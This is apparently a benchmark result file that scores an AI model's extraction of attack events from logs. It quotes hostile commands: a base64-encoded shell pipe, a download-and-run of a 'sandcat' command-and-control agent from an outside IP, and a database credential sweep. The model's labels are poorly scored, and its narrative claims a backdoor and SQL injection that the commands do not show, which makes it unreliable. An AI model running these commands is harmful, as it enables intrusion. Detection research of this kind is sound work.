@@ -1,0 +1,84 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c 'echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash'",
+        "stage": "Execution"
+      },
+      {
+        "command": "server.sh sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/server.sh --start-server --host=127.0.0.1 --enable-remote-auto-shutdown --port=0 --connection-secret /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token",
+        "stage": "Execution"
+      },
+      {
+        "command": "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sshd -D -R",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sh -c 'cd / && run-parts --report /etc/cron.hourly'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "curl -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux; chmod +x sandcat-linux; nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Execution & Command and Control"
+      },
+      {
+        "command": "apt-get update",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attacker deploys a Tomcat-based backdoor, executes SQL injections to gain database credentials, establishes persistence via SSH and scheduled tasks, detects the cloud environment, sets up a C2 channel via the sandcat malware, and uses APT updates as a cover for malicious activity.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 12521,
+      "completion_tokens": 2513,
+      "total_tokens": 15034,
+      "wall_clock_s": 52.275,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.2857142857142857,
+      "f1": 0.26666666666666666,
+      "tp": 2,
+      "fp": 6,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 8,
+      "fn": 7,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 12521,
+      "completion_tokens": 2513,
+      "total_tokens": 15034,
+      "wall_clock_s": 52.275,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
